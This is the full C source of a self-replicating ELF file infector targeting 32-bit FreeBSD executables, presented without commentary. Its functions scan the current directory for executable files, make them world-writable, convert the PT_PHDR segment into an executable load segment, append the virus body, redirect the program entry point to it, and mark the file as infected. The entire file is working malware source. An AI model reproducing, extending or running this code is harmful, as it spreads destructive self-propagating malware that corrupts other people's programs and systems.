#include "syscalls.h"

#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/uio.h>
#include <sys/stat.h>
#include <sys/elf32.h>
#include <sys/elf_common.h> 
#include <dirent.h>
#include <sys/mman.h>

#define MAX_VALUE 0xffffffff
#define PAD 0x00000000
#define GOOD 0
#define BAD 1

int syscall(int, ...);
char *find(char **, int *, int *);
int inject(char *, int, int, char *, int, char *, int);
void virus_end(void);






void
tail(char *head_vaddr, int head_sz, int ep_offset, char *tail_vaddr, int tail_sz)
{
	int dir_sz, find_offset;
	char *map_addr, *fn;
	struct stat s;



	map_addr = NULL;
	dir_sz = find_offset = 0;
	while ((fn = find(&map_addr, &dir_sz, &find_offset)) != NULL) {
		if (syscall(STAT, fn, &s) < 0) continue;
		if (syscall(CHMOD, fn, S_IRWXU|S_IRWXG|S_IRWXO) < 0) continue;

		inject(head_vaddr, head_sz, ep_offset, tail_vaddr, tail_sz, fn, (int)s.st_size);

		syscall(CHMOD, fn, s.st_mode);
	}

}






int
inject(char *head_vaddr, int head_sz, int ep_offset, char *tail_vaddr, int tail_sz, char *fn, int host_sz)
{
	int host_base_vaddr, vir_page_offset, virus_vaddr, virus_sz, n, i, fd, status;
	char head_copy[head_sz];
	Elf32_Ehdr *ehdr;
	Elf32_Phdr *phdr;
	char *p;
	int *e;


	status = BAD;
	virus_sz = head_sz + tail_sz;
	for (i = 0; i < head_sz; i++) head_copy[i] = head_vaddr[i];

	if ((fd = syscall(OPEN, fn, O_RDWR|O_APPEND)) < 0) return BAD;
	if ((p = (char *)syscall(MMAP, NULL, 0x100, PROT_READ|PROT_WRITE,
		MAP_SHARED, fd, (int)PAD, (off_t)0)) == MAP_FAILED) goto exit;

	ehdr = (Elf32_Ehdr *)p;
	phdr = (Elf32_Phdr *)&p[ehdr->e_phoff];
	
	e = (int *)&ehdr->e_ident[EI_MAG0];
	if (*e != 0x464C457F || ehdr->e_type != ET_EXEC || ehdr->e_ident[0xf] == 1 ||
		ehdr->e_ident[EI_OSABI] != ELFOSABI_FREEBSD) goto exit;

/* find host_base_vaddress */
	host_base_vaddr = MAX_VALUE;
	n = ehdr->e_phnum;
	for (i = 0; n > 0; n--,i++)
		if (phdr[i].p_type == PT_LOAD) 
			if (phdr[i].p_vaddr < host_base_vaddr)
				host_base_vaddr = phdr[i].p_vaddr;
	if (host_base_vaddr == MAX_VALUE) goto exit;							/* no PT_LOAD ? */
	host_base_vaddr &= 0xfffff000;

/* find virus_vaddr based upon host_base_address */
	vir_page_offset = host_sz & 0xfff;
	virus_vaddr = ((host_base_vaddr - vir_page_offset - virus_sz) & 0xfffff000) + vir_page_offset;

/* make program segment for virus */
	n = ehdr->e_phnum;
	for (i = 0; n > 0; n--, i++)
		if (phdr[i].p_type == PT_PHDR) {
			phdr[i].p_type = PT_LOAD;
			phdr[i].p_offset = host_sz;
			phdr[i].p_vaddr = virus_vaddr;
			phdr[i].p_paddr = virus_vaddr;
			phdr[i].p_filesz = virus_sz;
			phdr[i].p_memsz = virus_sz;
			phdr[i].p_flags = 0x7L;
			phdr[i].p_align = 0x1000L;
			break;
		}
	if (n == 0) goto exit;										/* no PT_PHDR :( */
		
/* change entry point on virus */
	e = (int *)&head_copy[ep_offset];
	*e = ehdr->e_entry;
	ehdr->e_entry = virus_vaddr;

	ehdr->e_ident[0xf] = 1;										/* infect flag */

	syscall(WRITE, fd, head_copy, head_sz);
	syscall(WRITE, fd, tail_vaddr, tail_sz);

	status = GOOD;
exit:	syscall(MUNMAP, p, 0x100);
	syscall(CLOSE, fd);

	return status;
}






char *
find(char **map_addr, int *dir_sz, int *find_offset)
{
	char dir[]={'.','\0'};
	struct dirent *de;
	char *cp, *ebuf;
	struct stat s;
	int fd, mask;


	if (*map_addr == NULL) {
		if ((fd = syscall(OPEN, dir, O_RDONLY)) < 0) return NULL;
		if (syscall(FSTAT, fd, &s) < 0) return NULL;
		*dir_sz = (int)s.st_size;
		cp = (char *)syscall(MMAP, NULL, (size_t)s.st_size, PROT_READ|PROT_WRITE,
			MAP_ANON, -1, (int)PAD, (off_t)0);						/* !! WARNING !! (SIZE_T)s.st_size */
		if (cp == MAP_FAILED) return NULL;
		*map_addr = cp;
		if (syscall(GETDENTS, fd, *map_addr, (size_t)s.st_size) < 0) return NULL;
		syscall(CLOSE, fd);
	}

	ebuf = *map_addr + *dir_sz;
	cp = *map_addr + *find_offset;
	mask = S_IXUSR | S_IXGRP | S_IXOTH;

	while (cp < ebuf) {
		de = (struct dirent *)cp;
		if (de->d_type == DT_REG && de->d_fileno != 0) {
			if (syscall(STAT, de->d_name, &s) < 0) return NULL;
			if (s.st_mode & mask) {
				*find_offset = (cp + de->d_reclen) - *map_addr;
				return &(de->d_name[0]);
			}
		}
		cp += de->d_reclen;
	}

	syscall(MUNMAP, *map_addr, *dir_sz);
	return NULL;
}






void virus_end(void) {}
